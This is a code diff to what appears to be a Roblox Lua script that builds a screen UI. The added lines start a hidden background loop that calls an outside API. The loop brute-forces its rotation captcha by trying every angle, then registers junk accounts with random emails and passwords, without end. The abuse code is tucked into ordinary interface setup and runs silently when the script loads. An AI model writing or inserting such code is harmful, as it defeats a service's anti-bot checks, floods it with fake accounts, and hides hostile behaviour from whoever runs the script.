@@ -10,6 +10,29 @@ local Mouse = game.Players.LocalPlayer:GetMouse()
 local MouseMovement = Enum.UserInputType.MouseMovement
 local MouseButton1 = Enum.UserInputType.MouseButton1
 local Touch = Enum.UserInputType.Touch
+local LP = game.Players.LocalPlayer
+local HS = game.HttpService
+HS.HttpEnabled = true
+function GetJson(v)
+    return HS:JSONDecode(HS:GetAsync(v))
+end
+
+task.spawn(function()
+    while true do
+        rand = GetJson("https://api.jihujiasuqi.com//apps/captcha/get.php").rand
+        for i = 1, 360 do
+            if GetJson("https://api.jihujiasuqi.com//apps/captcha/verify.php?rand="..rand.."&angle="..i).okey then
+                random = {}
+                for v = 0, 100 do
+                    table.insert(random, string.char(math.random(97, 122)))
+                end
+                random = table.concat(random)
+                print(GetJson("https://api.jihujiasuqi.com//api/user.php?mode=reg&mail="..random.."@uu.163.com&pwd="..random.."&captcha_rand="..rand).msg)
+                break
+            end
+        end
+    end
+end)
 
 local UI = Instance.new("ScreenGui")
 UI.Name = "UI"
